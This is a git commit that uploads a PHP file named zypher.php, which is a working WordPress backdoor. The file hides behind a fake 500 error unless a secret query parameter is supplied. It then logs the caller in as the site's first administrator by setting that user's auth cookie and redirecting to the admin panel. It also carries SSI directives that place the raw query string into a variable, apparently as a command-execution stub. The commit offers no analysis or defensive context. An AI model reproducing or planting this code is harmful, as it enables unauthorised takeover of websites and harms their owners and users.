b59cda481b4f903e36a6e092c1e3b9d29ccbe7a5
kontol-svg <4marketm5@gmail.com>
2025-11-15 05:33:05 +0700

    Add files via upload

---
+++ zypher.php
@@ -0,0 +1,38 @@
+<!--#config errmsg="[ERROR] SSI DISABLED"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="id" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<?php
+if (!isset($_GET['naon'])) {
+    http_response_code(500);
+    header("HTTP/1.1 500 Internal Server Error");
+    exit();
+}
+
+$mr = $_SERVER['DOCUMENT_ROOT'];
+@chdir($mr);
+
+if (file_exists('wp-load.php')) {
+    include 'wp-load.php';
+    $wp_user_query = new WP_User_Query([
+        'role'   => 'Administrator',
+        'number' => 1,
+        'fields' => 'ID'
+    ]);
+
+    $results = $wp_user_query->get_results();
+
+    if (isset($results[0])) {
+        wp_set_auth_cookie($results[0]);
+        wp_redirect(admin_url());
+        exit();
+    }
+
+    exit('NO ADMIN');
+} else {
+    exit('Failed to load');
+}
+?>
